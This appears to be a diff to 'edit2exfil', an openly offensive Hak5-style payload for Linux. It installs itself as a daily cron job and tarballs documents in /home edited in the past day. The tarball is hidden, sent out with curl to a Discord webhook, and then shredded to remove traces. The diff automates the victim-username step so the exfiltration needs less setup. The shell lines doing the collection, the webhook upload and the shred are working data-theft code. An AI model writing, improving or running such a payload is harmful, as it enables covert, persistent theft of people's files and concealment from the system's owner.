@@ -8,7 +8,7 @@ REM TARGET OS: Linux (tested on Kali Linux Release 2025-W19)
 
 REM DESCRIPTION: (See below)
 
-REM REQUIREMENTS: Place Discord webhook in the #WEBHOOK_URL constant on line 10 | Place the USER of the target system in the #USER constant on line 11 | Timing of when and how frequent the script will be ran (10:00 AM, daily by default) via `cronjob` can be changed in line 53.
+REM REQUIREMENTS: Place Discord webhook in the #WEBHOOK_URL constant on line 10 | Timing of when and how frequent the script will be ran (10:00 AM, daily by default) via `cronjob` can be changed in line 53.
 
 ==========================================================================================
 
@@ -19,7 +19,7 @@ edit2exfil is a persistent file exfiltration payload that embeds itself as a `cr
 **The payload builds a bash script (.e2e.sh) that performs multiple tasks in the following order:**
 
 1. a `net_check` conditional statement is utilized to see if the machine has internet connectivity. This is acheived by sending a `PING` to [Hak5.org](https://hak5.org). If `PING` was **NOT** successful, the script exits and will be ran again in 24 hours by default (or the next scheduled time of your choosing). If the `PING` **WAS** successful, the script moves to a secondary conditional statement >
-2. a `file_check` conditional statement is utilized to see if the following document file types have been modified (edited) in the past 24 hours: `.txt, .pdf, .docx, .doc, .csv, .xlsx, .png, .jpg, .jpeg, .sh`. If there are **NOT** any documents (with the previous file types) that have been modified in the past 24 hours, the script exits and will be ran again in 24 hours by default (or the next scheduled time of your choosing), else >
+2. a `file_check` conditional statement is utilized to see if the following document file types have been modified (edited) in the past 24 hours in the /home directory (recursively): `.txt, .pdf, .docx, .doc, .csv, .xlsx, .png, .jpg, .jpeg, .sh`. If there are **NOT** any documents (with the previous file types) that have been modified in the past 24 hours in the /home directory (recursively), the script exits and will be ran again in 24 hours by default (or the next scheduled time of your choosing), else >
 3. The files are tarballed (.loot.tar.gz) and placed (hidden) in the /home directory for exfiltration >
 4. The tarball is then exfiltrated via Discord webhook >
 5. The tarball is then `shredded` to obfuscate its' presence >
@@ -51,6 +51,9 @@ net_check() {
     ping -c 1 hak5.org
 }
 
+# Creating global $user variable:
+user="$(whoami)"
+
 # If internet connection, check for files, if files, tarball, else exit:
 if net_check; then
     if file_check; then
@@ -64,7 +67,7 @@ fi
 
 # Exfiltrate tarball of found files to Discord:
 curl -X POST -H "Content-Type: multipart/form-data" \
--F "file=@/home/#USER/.loot.tar.gz" \
+-F "file=@/home/$user/.loot.tar.gz" \
 -F "content=$ Loot Incoming $" \
 #WEBHOOK_URL
 
@@ -99,6 +102,7 @@ tarball() {
 net_check() {
     ping -c 1 hak5.org
 }
+user="$(whoami)"
 
 if net_check; then
     if file_check; then
@@ -110,7 +114,7 @@ else
     :
 fi
 curl -X POST -H "Content-Type: multipart/form-data" \
--F "file=@/home/#USER/.loot.tar.gz" \
+-F "file=@/home/$user/.loot.tar.gz" \
 -F "content=$ Loot Incoming $" \
 #WEBHOOK_URL
 shred -fuz ~/.loot.tar.gz
